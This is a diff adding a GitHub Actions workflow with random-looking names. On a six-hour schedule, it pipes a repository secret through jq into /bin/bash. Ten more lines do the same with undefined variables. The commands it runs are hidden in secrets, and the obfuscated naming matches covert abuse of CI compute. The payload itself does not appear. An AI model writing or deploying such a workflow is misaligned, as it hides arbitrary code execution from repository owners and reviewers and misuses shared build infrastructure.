@@ -1,0 +1,29 @@
+name: boajialiyli
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '58 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: boajialiyli
+        env:
+          wv86669: ${{ secrets.wv86669 }}
+        run: |
+          echo $wv86669 | jq -r .efxh1 | /bin/bash
+          echo $xdmbe696 | jq -r .ktx7 | /bin/bash
+          echo $irmhc46 | jq -r .hdtvg96 | /bin/bash
+          echo $hy77762 | jq -r .ijzk3 | /bin/bash
+          echo $pr3727 | jq -r .o1 | /bin/bash
+          echo $jvdq24 | jq -r .jb97917 | /bin/bash
+          echo $erztt310 | jq -r .jqule5060 | /bin/bash
+          echo $nw4679 | jq -r .lsex5 | /bin/bash
+          echo $wjnie66 | jq -r .ite70 | /bin/bash
+          echo $qdo910 | jq -r .aqe2478 | /bin/bash
+          echo $edt70086 | jq -r .seg8 | /bin/bash
+
